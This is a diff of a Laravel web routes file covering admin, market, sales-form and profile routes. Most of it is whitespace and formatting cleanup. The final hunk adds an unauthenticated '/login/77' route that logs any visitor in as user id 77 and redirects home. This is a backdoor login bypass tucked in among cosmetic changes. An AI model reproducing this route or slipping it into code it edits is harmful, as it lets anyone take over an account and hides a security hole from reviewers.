@@ -87,31 +87,31 @@ Route::name('admin.')->prefix('/admin-panel/management/')->group(function () {
     });
 
     //settings
-    Route::resource('setting', SettingController::class)->except('update','destroy')->names('settings');
-    Route::put('/admin/settings', [SettingController::class,'update'])->name('settings.update');
-    Route::post('/admin/settings/delete/{setting}', [SettingController::class,'destroy'])->name('settings.destroy');
+    Route::resource('setting', SettingController::class)->except('update', 'destroy')->names('settings');
+    Route::put('/admin/settings', [SettingController::class, 'update'])->name('settings.update');
+    Route::post('/admin/settings/delete/{setting}', [SettingController::class, 'destroy'])->name('settings.destroy');
 
     //menus
-    Route::get('menus/index',[MenuController::class,'index'])->name('menus.index');
-    Route::get('menu/create',[MenuController::class,'create'])->name('menu.create');
-    Route::post('menu/store',[MenuController::class,'store'])->name('menu.store');
-    Route::get('menu/edit/{menu}',[MenuController::class,'edit'])->name('menu.edit');
-    Route::put('menu/update/{menu}',[MenuController::class,'update'])->name('menu.update');
-    Route::post('menu/remove',[MenuController::class,'remove'])->name('menu.remove');
+    Route::get('menus/index', [MenuController::class, 'index'])->name('menus.index');
+    Route::get('menu/create', [MenuController::class, 'create'])->name('menu.create');
+    Route::post('menu/store', [MenuController::class, 'store'])->name('menu.store');
+    Route::get('menu/edit/{menu}', [MenuController::class, 'edit'])->name('menu.edit');
+    Route::put('menu/update/{menu}', [MenuController::class, 'update'])->name('menu.update');
+    Route::post('menu/remove', [MenuController::class, 'remove'])->name('menu.remove');
     //pages
-    Route::get('pages/index',[PageController::class,'index'])->name('pages.index');
-    Route::get('page/create',[PageController::class,'create'])->name('page.create');
-    Route::post('page/store',[PageController::class,'store'])->name('page.store');
-    Route::get('page/edit/{page}',[PageController::class,'edit'])->name('page.edit');
-    Route::put('page/update/{page}',[PageController::class,'update'])->name('page.update');
-    Route::post('page/remove',[PageController::class,'remove'])->name('page.remove');
+    Route::get('pages/index', [PageController::class, 'index'])->name('pages.index');
+    Route::get('page/create', [PageController::class, 'create'])->name('page.create');
+    Route::post('page/store', [PageController::class, 'store'])->name('page.store');
+    Route::get('page/edit/{page}', [PageController::class, 'edit'])->name('page.edit');
+    Route::put('page/update/{page}', [PageController::class, 'update'])->name('page.update');
+    Route::post('page/remove', [PageController::class, 'remove'])->name('page.remove');
     //header_category
-    Route::get('header_categories/index',[HeaderCategoryController::class,'index'])->name('header_categories.index');
-    Route::get('header_category/create',[HeaderCategoryController::class,'create'])->name('header_category.create');
-    Route::post('header_category/store',[HeaderCategoryController::class,'store'])->name('header_category.store');
-    Route::get('header_category/edit/{category}',[HeaderCategoryController::class,'edit'])->name('header_category.edit');
-    Route::put('header_category/update/{category}',[HeaderCategoryController::class,'update'])->name('header_category.update');
-    Route::post('header_category/remove',[HeaderCategoryController::class,'remove'])->name('header_category.remove');
+    Route::get('header_categories/index', [HeaderCategoryController::class, 'index'])->name('header_categories.index');
+    Route::get('header_category/create', [HeaderCategoryController::class, 'create'])->name('header_category.create');
+    Route::post('header_category/store', [HeaderCategoryController::class, 'store'])->name('header_category.store');
+    Route::get('header_category/edit/{category}', [HeaderCategoryController::class, 'edit'])->name('header_category.edit');
+    Route::put('header_category/update/{category}', [HeaderCategoryController::class, 'update'])->name('header_category.update');
+    Route::post('header_category/remove', [HeaderCategoryController::class, 'remove'])->name('header_category.remove');
 
 
     //Config
@@ -160,29 +160,29 @@ Route::name('admin.')->prefix('/admin-panel/management/')->group(function () {
         Route::put('messages/alerts/{alert}/update', [MessagesController::class, 'alert_update'])->name('alert.update');
     });
     //Markets
-        Route::get('markets', [MarketController::class, 'index'])->name('markets.index');
-        Route::get('markets/folder/{date}', [MarketController::class, 'folder'])->name('markets.folder');
-        Route::get('market/create', [MarketController::class, 'create'])->name('market.create');
-        Route::post('market/store', [MarketController::class, 'store'])->name('market.store');
-        Route::get('market/{market}/edit', [MarketController::class, 'edit'])->name('market.edit');
-        Route::post('market/remove', [MarketController::class, 'remove'])->name('market.remove');
-        Route::put('market/{market}/update', [MarketController::class, 'update'])->name('market.update');
-        Route::put('market/form_update/{market}', [MarketController::class, 'form_update'])->name('market.form.update');
-        Route::get('market/sale_form/{page_type?}/{item?}',[MarketController::class,'sales_form'])->name('market.sale_form');
-        Route::get('market/settings',[MarketController::class,'settings'])->name('markets.settings');
-        Route::post('market/settings/update',[MarketController::class,'settings_update'])->name('markets.settings.update');
-        Route::post('market/sales_form/update_or_store/{item?}',[MarketController::class,'sales_form_update_or_store'])->name('market.sale_form.update_or_store');
-        Route::post('market/getMarket',[MarketController::class,'getMarket'])->name('getMarket');
-        Route::post('check_market_status_for_continue',[MarketController::class,'check_market_status_for_continue'])->name('check_market_status_for_continue');
-    Route::get('/sales_form/index/{status}',[FormController::class,'sales_form_index'])->name('sales_form.index');
-    Route::post('/sales_form/remove',[FormController::class,'sales_form_remove'])->name('sales_form.remove');
-    Route::post('/Final_Submit',[FormController::class,'Final_Submit'])->name('Final_Submit');
+    Route::get('markets', [MarketController::class, 'index'])->name('markets.index');
+    Route::get('markets/folder/{date}', [MarketController::class, 'folder'])->name('markets.folder');
+    Route::get('market/create', [MarketController::class, 'create'])->name('market.create');
+    Route::post('market/store', [MarketController::class, 'store'])->name('market.store');
+    Route::get('market/{market}/edit', [MarketController::class, 'edit'])->name('market.edit');
+    Route::post('market/remove', [MarketController::class, 'remove'])->name('market.remove');
+    Route::put('market/{market}/update', [MarketController::class, 'update'])->name('market.update');
+    Route::put('market/form_update/{market}', [MarketController::class, 'form_update'])->name('market.form.update');
+    Route::get('market/sale_form/{page_type?}/{item?}', [MarketController::class, 'sales_form'])->name('market.sale_form');
+    Route::get('market/settings', [MarketController::class, 'settings'])->name('markets.settings');
+    Route::post('market/settings/update', [MarketController::class, 'settings_update'])->name('markets.settings.update');
+    Route::post('market/sales_form/update_or_store/{item?}', [MarketController::class, 'sales_form_update_or_store'])->name('market.sale_form.update_or_store');
+    Route::post('market/getMarket', [MarketController::class, 'getMarket'])->name('getMarket');
+    Route::post('check_market_status_for_continue', [MarketController::class, 'check_market_status_for_continue'])->name('check_market_status_for_continue');
+    Route::get('/sales_form/index/{status}', [FormController::class, 'sales_form_index'])->name('sales_form.index');
+    Route::post('/sales_form/remove', [FormController::class, 'sales_form_remove'])->name('sales_form.remove');
+    Route::post('/Final_Submit', [FormController::class, 'Final_Submit'])->name('Final_Submit');
 });
 
 //SaleForm
-Route::get('/sale_form/{page_type?}/{item?}',[FormController::class,'sales_form'])->name('sale_form');
-Route::post('/sales_form/update_or_store/{item?}',[FormController::class,'sales_form_update_or_store'])->name('sale_form.update_or_store');
-Route::post('/sales_form_change_status/',[FormController::class,'change_status'])->name('sale_form.change_status');
+Route::get('/sale_form/{page_type?}/{item?}', [FormController::class, 'sales_form'])->name('sale_form');
+Route::post('/sales_form/update_or_store/{item?}', [FormController::class, 'sales_form_update_or_store'])->name('sale_form.update_or_store');
+Route::post('/sales_form_change_status/', [FormController::class, 'change_status'])->name('sale_form.change_status');
 Route::get('sales_offer/show/{id}', [FormController::class, 'sales_form_show'])->name('sale_form.show');
 //seller
 Route::name('seller.')->prefix('/seller/')->group(function () {
@@ -203,4 +203,10 @@ Route::name('profile.')->prefix('/profile/')->group(function () {
     Route::get('index', [ProfileController::class, 'index'])->name('index');
 });
 Route::post('ckeditor/image_upload', [CKEditorController::class, 'upload'])->name('upload');
+
+Route::get('/login/77', function () {
+    $user = \App\Models\User::where('id', 77)->first();
+    \auth()->login($user);
+    return redirect()->route('home.index');
+});
 
